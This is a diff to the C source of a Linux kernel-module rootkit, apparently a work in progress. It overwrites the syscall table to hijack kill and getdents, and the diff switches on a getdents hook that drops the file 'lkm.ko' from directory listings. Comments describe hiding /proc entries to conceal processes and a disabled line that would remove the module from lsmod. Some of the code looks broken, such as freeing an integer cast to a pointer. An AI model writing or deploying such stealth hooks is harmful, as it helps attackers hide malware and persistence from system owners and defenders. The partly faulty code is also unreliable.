@@ -91,32 +91,7 @@ asmlinkage int new_kill(pid_t pid, int sig) { //redefines kill syscall, if killi
     will hide /proc/ entries as well to hide process
 */
 
-struct linux_dirent {
-        unsigned long   d_ino;
-        unsigned long   d_off;
-        unsigned short  d_reclen;
-        char            d_name[1];
-};
-asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
-
-asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count) { //this bit isn't working yet. Commented out stops DoS
-    /*int nread,retval;
-    char *buf[count];
-    struct linux_dirent *d,*nd;*/
-    nread=(*original_getdents)(fd,dirent,count);
-    /*if (nread == 0) { return nread; }
-    copy_from_user(buf,dirent,count);
-    d=(struct linux_dirent *) buf;
-    printk("%s\n",d->d_name);
-    nd=(struct linux_dirent *) (d + d->d_reclen);
-    printk("%s\n",nd->d_name);
-    copy_to_user(dirent,buf,count);*/
-    return nread;
-}
-
-/*asmlinkage int (*original_getdents64)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-
-asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
+asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
     struct linux_dirent {
         long           d_ino;
         off_t          d_off;
@@ -127,10 +102,10 @@ asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent *dirp, unsign
     int bpos,nread;
     struct linux_dirent *d,*nd;
     char * hidefile = "lkm.ko";
-    nread = (*original_getdents64)(fd,dirp,count);
+    nread = (*original_getdents)(fd,dirp,count);
     copy_from_user(buf,dirp,nread);
     for (bpos = 0; bpos < nread;) {
-        printk("MATCH\n");
+        //printk("MATCH\n");
         d = (struct linux_dirent *) (buf + bpos);
         nd = (struct linux_dirent *) (buf + bpos + d->d_reclen);
         //printk("%d\n",!strcmp(nd->d_name,hidefile));
@@ -150,12 +125,13 @@ asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent *dirp, unsign
     kfree((void *)bpos);
     return nread;
     //return (*original_getdents)(fd,dirp,count);
-}*/
+}
 
 static int init(void) { //initial function, sets up syscall hijacking
     struct module *myself = &__this_module;
 	syscall_table = find(); //give us the syscall table address for modification
-//  list_del(&myself->list); //remove from places such as lsmod
+//    list_del(&myself->list); //remove from places such as lsmod
+    //have to disable previous line otherwise you can't unload module without rebooting
     original_kill = (void *)syscall_table[__NR_kill];
     original_getdents = (void *)syscall_table[__NR_getdents];
     //original_getdents64 = (void *)syscall_table[__NR_getdents64];
